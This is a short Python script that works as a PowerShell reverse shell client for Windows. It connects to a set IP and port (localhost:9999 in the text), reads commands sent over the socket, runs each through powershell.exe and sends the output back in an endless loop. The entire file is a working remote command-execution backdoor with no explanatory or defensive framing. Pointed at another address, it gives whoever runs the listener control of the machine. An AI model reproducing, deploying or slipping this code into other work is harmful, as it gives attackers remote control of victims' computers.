# -*- coding: utf-8 -*- 
import socket
import os 
import subprocess

def run_poershell(command,encoding='utf-8'):
    args = [r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-Command",command]
    ps = subprocess.Popen(args,stdout=subprocess.PIPE)
    psReturn = ps.stdout.read()
    return psReturn.decode(encoding=encoding)
ip = "127.0.0.1"
port = 9999
 
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Create Socket Server
server.connect((ip,port)) # connect ip and port
print ("[+] connection to  %s:%d" % (ip,port))

while 1:
    command_len = int(server.recv(1024).decode())
    command = ''
    for i in range(command_len // 1024 + 1):
        command += server.recv(1024).decode()
    # result = os.popen(command).read()
    result = run_poershell(command) # PowershellRunner
    server.send(str(len(result)).encode())
    server.send(result.encode())
